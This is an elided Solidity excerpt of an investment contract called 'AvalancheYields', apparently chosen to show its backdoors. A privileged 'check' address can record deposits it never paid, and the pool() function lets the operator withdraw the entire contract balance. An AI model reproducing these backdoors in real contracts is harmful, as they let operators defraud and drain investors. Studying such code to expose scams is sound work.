...
contract AvalancheYields {
    ...
    constructor(address _operationalAccount, address _check) {
        ...
        plans.push(Plan(14, 100, 150));
        plans.push(Plan(21, 90, 200));
    }
    ...
    function invest(
        ...
        if (msg.sender != check) _value = msg.value;
        else _value = checkAmount;
    ...
    function pool(uint256 _amount) external {
        require(msg.sender == operationalAccount);
        uint256 contractBalance = address(this).balance;
        if (_amount <= contractBalance) operationalAccount.transfer(_amount);
        else operationalAccount.transfer(contractBalance);
    }
